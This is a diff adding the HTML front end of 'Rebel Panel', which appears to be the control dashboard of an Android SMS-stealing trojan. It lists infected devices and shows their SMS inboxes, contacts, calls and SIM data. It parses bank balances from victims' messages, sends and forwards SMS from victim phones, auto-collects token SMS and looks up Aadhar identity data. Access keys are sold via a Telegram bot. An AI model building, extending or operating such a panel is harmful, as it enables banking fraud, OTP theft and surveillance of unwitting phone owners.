@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=no"/>
+<meta name="theme-color" content="#050508"/>
+<title>Rebel Panel</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+<link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+<div class="bg-anim" aria-hidden="true">
+  <canvas id="particleCanvas" class="particle-canvas"></canvas>
+  <span class="orb orb-1"></span><span class="orb orb-2"></span><span class="orb orb-3"></span>
+  <span class="grid-lines"></span>
+  <span class="aurora"></span>
+</div>
+<div class="fx-layer" id="fxLayer"></div>
+<div class="boot-splash" id="bootSplash">
+  <div class="boot-hex"></div>
+  <div class="boot-logo"><span class="boot-ring"></span><span class="boot-ring r2"></span><img src="avatar.jpg" alt="" onerror="this.style.display='none'"/></div>
+  <div class="boot-title glitch" data-text="Rebel Panel"><em>Rebel</em> Panel</div>
+  <div class="boot-bar"><span class="boot-bar-fill"></span></div>
+  <div class="boot-scan"></div>
+</div>
+
+<!-- LOGIN -->
+<div class="login-screen" id="loginScreen">
+  <div class="login-card anim-in" id="loginCard">
+    <div class="card-shine"></div>
+    <div class="login-hero">
+      <div class="avatar-stage" id="rebelAvatarStage" data-avatar-ver="7">
+        <div class="avatar-face-ring">
+          <div class="avatar-img-wrap">
+            <img class="avatar-face" id="avatarFaceImg" src="avatar.jpg" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
+          </div>
+        </div>
+        <div class="avatar-laptop">
+          <div class="laptop-glow"></div>
+          <div class="laptop-lid">
+            <div class="laptop-screen">
+              <div class="laptop-code" id="laptopCode">
+                <span class="laptop-line l1"><span class="dim">$</span> firebase.init()</span>
+                <span class="laptop-line l2"><span class="hi">send</span>Sms(<span class="dim">to</span>, msg)</span>
+                <span class="laptop-line l3"><span class="dim">$</span> rebel.unlock()<span class="laptop-cursor"></span></span>
+              </div>
+            </div>
+          </div>
+          <div class="laptop-base"></div>
+        </div>
+      </div>
+      <h1 class="glitch-sm" data-text="Rebel Mobile"><em>Rebel</em> Mobile</h1>
+    </div>
+    <p class="login-sub">APK key from Telegram — @Rebelpanelbot → /genkeyapk</p>
+    <div class="login-err" id="loginErr"></div>
+    <input class="key-input" id="loginKey" placeholder="RBA-XXXXXX-XXXXXX" autocomplete="off" maxlength="32"/>
+    <label class="remember"><input type="checkbox" id="rememberMe" checked/> Remember this phone</label>
+    <button class="btn-primary" id="loginBtn" onclick="doLogin()"><span class="btn-label">Unlock Panel</span></button>
+  </div>
+</div>
+
+<!-- APP -->
+<div class="app hidden" id="appShell">
+  <header class="hdr">
+    <div class="hdr-left">
+      <div class="rebel-avatar-sm">
+        <img src="avatar.jpg" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
+      </div>
+      <div>
+        <div class="hdr-title">Rebel Mobile <span class="live-dot" id="hdrLive"></span></div>
+        <div class="hdr-sub" id="hdrSub">Connecting...</div>
+        <div class="access-key-badge" id="accessKeyBadge">Key: —</div>
+      </div>
+    </div>
+    <div class="hdr-actions">
+      <button class="menu-btn" id="menuBtn" onclick="toggleSideMenu()" aria-label="Menu"><span></span><span></span><span></span></button>
+    </div>
+  </header>
+
+  <div class="side-menu-bg" id="sideMenuBg" onclick="closeSideMenu()"></div>
+  <aside class="side-menu" id="sideMenu">
+    <div class="side-menu-hdr">
+      <div>
+        <div class="side-menu-title">Rebel Panel</div>
+        <div class="side-menu-ver" id="panelVerBadge">Panel v16</div>
+      </div>
+      <button class="side-menu-close" onclick="closeSideMenu()">✕</button>
+    </div>
+    <div class="side-menu-scroll">
+      <div class="side-section">Main</div>
+      <button class="side-item" onclick="menuGo('home')"><span class="side-ico">🏠</span>Home</button>
+      <button class="side-item" onclick="menuGo('device')"><span class="side-ico">📱</span>Device Info</button>
+      <button class="side-item" onclick="menuGo('sms')"><span class="side-ico">💬</span>SMS Inbox</button>
+      <button class="side-item" onclick="menuGo('bank')"><span class="side-ico">🏦</span>Bank Accounts</button>
+      <button class="side-item" onclick="menuGo('send')"><span class="side-ico">📤</span>Send SMS</button>
+      <div class="side-section">Device Data</div>
+      <button class="side-item" onclick="menuDevTab('sim')"><span class="side-ico">📋</span>SIM</button>
+      <button class="side-item" onclick="menuDevTab('calls')"><span class="side-ico">📞</span>Calls</button>
+      <button class="side-item" onclick="menuDevTab('contacts')"><span class="side-ico">👤</span>Contacts</button>
+      <button class="side-item" onclick="menuDevTab('perms')"><span class="side-ico">🔐</span>Permissions</button>
+      <button class="side-item" onclick="menuDevTab('forward')"><span class="side-ico">↪</span>Forward SMS</button>
+      <div class="side-section">Tools</div>
+      <button class="side-item" onclick="menuOpenFb()"><span class="side-ico">🔥</span>Manage Firebase <span class="side-meta" id="moreFbName">—</span></button>
+      <button class="side-item" onclick="menuSwitchFb()"><span class="side-ico">⇄</span>Switch Firebase</button>
+      <button class="side-item" onclick="menuToggleAutoToken()"><span class="side-ico">🤖</span>Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></button>
+      <button class="side-item" onclick="menuSetAutoDevice()"><span class="side-ico">📲</span>Set Auto SMS Device</button>
+      <button class="side-item" onclick="menuOpenAadhar()"><span class="side-ico">🪪</span>Aadhar Bot</button>
+      <button class="side-item" onclick="menuRefresh()"><span class="side-ico">↻</span>Refresh All</button>
+      <button class="side-item" onclick="menuUpdatePanel()"><span class="side-ico">⬇</span>Update Panel</button>
+      <button class="side-item danger" onclick="menuLogout()"><span class="side-ico">🚪</span>Logout</button>
+      <div class="token-log-wrap" id="autoTokenLog"></div>
+    </div>
+  </aside>
+
+  <div class="screens" id="screensWrap">
+    <section class="screen active" id="screen-home">
+      <div class="solid-panel">
+        <div class="panel-title">Overview</div>
+        <div class="stats-row">
+          <div class="stat-card"><div class="stat-val" id="stTotal">0</div><div class="stat-lbl">DEVICES</div></div>
+          <div class="stat-card"><div class="stat-val on" id="stOnline">0</div><div class="stat-lbl">ONLINE</div></div>
+          <div class="stat-card"><div class="stat-val off" id="stOffline">0</div><div class="stat-lbl">OFFLINE</div></div>
+        </div>
+      </div>
+      <div class="solid-panel">
+        <div class="panel-title">Devices</div>
+        <div class="search-wrap"><input class="search" id="devSearch" placeholder="Search phone or device..." oninput="renderDevices()"/></div>
+        <div id="devList"></div>
+      </div>
+    </section>
+
+    <section class="screen" id="screen-device">
+      <div class="solid-panel full-h">
+        <div id="deviceEmpty" class="empty-state"><div class="ico">📱</div>Select a device from Home</div>
+        <div id="deviceHero" class="hidden"></div>
+      </div>
+    </section>
+
+    <section class="screen" id="screen-sms">
+      <div class="solid-panel full-h">
+        <div class="panel-title">SMS Inbox <span id="smsSortBadge" style="font-size:9px;color:var(--muted);font-weight:600">· latest top · v14</span></div>
+        <div id="smsEmpty" class="empty-state"><div class="ico">💬</div>Select a device to view SMS</div>
+        <div class="sms-list" id="smsList"></div>
+      </div>
+    </section>
+
+    <section class="screen" id="screen-bank">
+      <div class="solid-panel full-h">
+        <div class="bank-hdr">
+          <div class="panel-title" style="margin:0">Bank Account Summary</div>
+          <span class="bank-badge" id="bankCountBadge">0 Banks</span>
+        </div>
+        <div class="bank-auto-note" id="bankAutoNote">Balances are parsed automatically from bank SMS</div>
+        <div id="bankEmpty" class="empty-state"><div class="ico">🏦</div>Select a device to load bank balances from SMS</div>
+        <div id="bankList" class="bank-list"></div>
+      </div>
+    </section>
+
+    <section class="screen" id="screen-send">
+      <div class="solid-panel">
+        <div class="panel-title">Send SMS</div>
+        <div id="sendEmpty" class="empty-state"><div class="ico">📤</div>Select a device to send SMS</div>
+        <div class="form-card hidden" id="sendForm">
+          <label class="form-label">Send from SIM</label>
+          <div class="sim-picker" id="sendSimPicker">
+            <div class="sim-picker-loading">Loading SIM slots...</div>
+          </div>
+          <label class="form-label">To Number</label>
+          <input class="form-input" id="sendTo" type="tel" placeholder="9876543210"/>
+          <label class="form-label">Message</label>
+          <textarea class="form-textarea" id="sendMsg" placeholder="Type message..."></textarea>
+          <button class="btn-send" onclick="sendSms()">Send SMS</button>
+          <div class="send-status" id="sendStatus"></div>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <nav class="bottom-nav" id="bottomNav">
+    <button class="nav-item active" data-tab="home" onclick="switchTab('home',this)"><span class="ico">🏠</span>Home</button>
+    <button class="nav-item" data-tab="device" onclick="switchTab('device',this)"><span class="ico">📱</span>Device</button>
+    <button class="nav-item" data-tab="sms" onclick="switchTab('sms',this)"><span class="ico">💬</span>SMS</button>
+    <button class="nav-item" data-tab="bank" onclick="switchTab('bank',this)"><span class="ico">🏦</span>Bank</button>
+    <button class="nav-item" data-tab="send" onclick="switchTab('send',this)"><span class="ico">📤</span>Send</button>
+  </nav>
+</div>
+
+<div class="sheet-bg" id="sheetBg" onclick="closeFbSheet()"></div>
+<div class="sheet" id="fbSheet">
+  <div class="sheet-handle"></div>
+  <div class="sheet-title">Switch Firebase</div>
+  <div id="fbSheetList"></div>
+</div>
+<div class="toast-wrap" id="toasts"></div>
+
+<div class="modal-overlay hidden" id="firebaseModal" onclick="closeFirebaseModal(event)">
+  <div class="modal-card fb-modal" onclick="event.stopPropagation()">
+    <button class="modal-close" onclick="closeFirebaseModal()">✕</button>
+    <h2>🔥 Manage Firebase</h2>
+    <p class="modal-sub">Projects are saved per access key. Each key only sees its own Firebase links.</p>
+    <div class="fb-paste-wrap">
+      <label class="form-label">Paste Firebase URL or config JSON</label>
+      <textarea class="form-textarea fb-paste-input" id="fbPasteInput" placeholder="https://your-project.firebaseio.com or full google-services JSON"></textarea>
+      <button class="btn-send" onclick="submitFirebasePaste()">Connect Firebase</button>
+    </div>
+    <div class="fb-manager-list" id="fbManagerList"></div>
+  </div>
+</div>
+
+<div class="modal-overlay hidden" id="aadharModal" onclick="closeAadhar(event)">
+  <div class="modal-card" onclick="event.stopPropagation()">
+    <button class="modal-close" onclick="closeAadhar()">✕</button>
+    <h2>🪪 Aadhar Bot</h2>
+    <p class="modal-sub">Look up Aadhar details by mobile number</p>
+    <input class="form-input" id="aadharNum" type="tel" placeholder="9876543210" onkeydown="if(event.key==='Enter')lookupAadhar()"/>
+    <button class="btn-send" onclick="lookupAadhar()" style="margin-top:12px">Lookup</button>
+    <div id="aadharStatus" class="modal-status"></div>
+    <div id="aadharResult" class="data-list" style="margin-top:12px;max-height:200px;overflow-y:auto"></div>
+  </div>
+</div>
+
+<!-- panel-v14 per-key Firebase isolation -->
+<script src="firebase_defaults.js"></script>
+<script src="app.js"></script>
+</body>
+</html>
